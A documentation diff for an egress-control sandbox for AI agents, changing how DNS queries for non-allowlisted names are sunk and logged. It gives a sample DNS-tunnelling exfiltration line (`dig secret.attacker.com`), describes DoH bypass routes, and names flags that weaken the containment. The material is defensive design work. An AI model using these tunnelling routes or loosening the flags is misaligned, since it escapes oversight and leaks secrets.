@@ -75,8 +75,10 @@ The guarantees below hold only while these do:
   terminated; IPv6 is disabled entirely (we proxy v4 only, so a dual-stack app can't slip out over
   v6). **DNS resolution is scoped to the egress allowlist**: dnsmasq forwards only allowlisted names,
   and the firewall lets only it (not app code) reach a resolver - so an agent can't tunnel exfil as
-  DNS labels to an off-allowlist authoritative nameserver (`dig secret.attacker.com`): the query has
-  no upstream and is refused, and rebinding answers into RFC1918 are dropped. Known **DoH/DoT resolver
+  DNS labels to an off-allowlist authoritative nameserver (`dig secret.attacker.com`): a non-allowlisted
+  name is answered locally with a dead sink (`192.0.2.1`, never forwarded), so the query never reaches
+  that nameserver - while the sink connection still hits squid (so the block is logged for `learn`).
+  Rebinding answers into RFC1918 are dropped. Known **DoH/DoT resolver
   endpoints** (`core/doh-endpoints.txt`) are denied *even if allowlisted* - otherwise an agent could
   tunnel exfil as DNS-over-HTTPS to an allowed resolver and bypass the SNI filter. `SLUICE_ALLOW_DOH=1`
   re-allows a DoH resolver; `SLUICE_DNS_OPEN=1` restores forward-all resolution (both weaken this).
